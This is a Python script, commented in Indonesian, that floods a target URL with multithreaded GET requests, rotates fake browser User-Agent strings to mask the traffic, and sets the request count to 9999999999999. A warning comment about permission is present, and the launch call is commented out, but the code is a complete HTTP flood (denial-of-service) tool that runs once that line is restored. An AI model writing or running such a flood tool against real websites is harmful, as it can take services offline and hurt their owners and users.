import requests
import threading
import random
import time

def send_request(url, user_agents):
    """
    Mengirimkan permintaan GET ke URL dengan header User-Agent acak.

    Args:
        url: URL target.
        user_agents: Daftar string User-Agent.
    """
    headers = {
        "User-Agent": random.choice(user_agents)
    }
    try:
        response = requests.get(url, headers=headers, timeout=5)  # Menambahkan timeout
        response.raise_for_status()  # Menimbulkan pengecualian untuk kode status yang buruk (4xx atau 5xx)
        print(f"Sukses: {url} - Status Code: {response.status_code}, User-Agent: {headers['User-Agent']}")
        # Anda dapat memproses respons lebih lanjut di sini, misalnya:
        # print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Gagal: {url} - Error: {e}")


def send_multiple_requests(url, num_requests, user_agents, delay=0):
    """
    Mengirimkan beberapa permintaan GET ke URL menggunakan threading.

    Args:
        url: URL target.
        num_requests: Jumlah permintaan yang akan dikirim.
        user_agents: Daftar string User-Agent.
        delay: Penundaan antar permintaan dalam detik (default: 0).
    """
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(url, user_agents))
        threads.append(thread)
        thread.start()
        time.sleep(delay)  # Menambahkan penundaan antar pembuatan thread

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = "https://www.example.com"  # Ganti dengan URL target yang sah HANYA dengan izin
    num_requests = 9999999999999
    request_delay = 0.1  # Penundaan dalam detik

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
        # ... tambahkan lebih banyak User-Agent jika diperlukan ...
    ]

    # PERINGATAN: Jangan jalankan kode ini tanpa izin eksplisit dari pemilik situs web.
    # send_multiple_requests(target_url, num_requests, user_agents, request_delay)
